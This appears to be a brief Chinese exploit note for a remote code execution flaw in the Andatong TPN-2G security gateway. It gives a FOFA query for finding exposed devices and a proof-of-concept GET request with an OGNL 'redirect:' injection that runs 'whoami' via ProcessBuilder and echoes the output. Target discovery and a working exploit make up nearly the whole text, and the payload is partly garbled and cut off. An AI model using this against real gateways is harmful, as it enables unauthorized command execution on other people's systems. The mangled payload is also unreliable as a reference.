## 安达通TPN-2G安全网关远程代码执行

## fofa
```
 title="TPN-2G" || title="SJW74"
```

## poc
```
GET /lan/admin_getLisence?redirect:${%23a%3dnew%20java.lang.ProcessBuilder(new%20java.lang.String[]{%22whoami%22}).start().getInputStream(),%23b%3dnew%http://20java.io.InputStreamReader(%23a),%23c%3dnew%http://20java.io.BufferedReader(%23b),%23d%3dnew%20char[51020],%23c.read(%23d),%23screen%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27).getWriter(),%23screen.println(%23d),%23screen.close()}%22%3Etest.action?redirect:${%23a%3dnew%20java.lang.ProcessBuilder(new%20java.lang.String[]{%22test%22}).start().getInputStream(),%23b%3dnew%http://20java.io.InputStreamReader(%23a),%23c%3dnew%20java HTTP/1.1

```
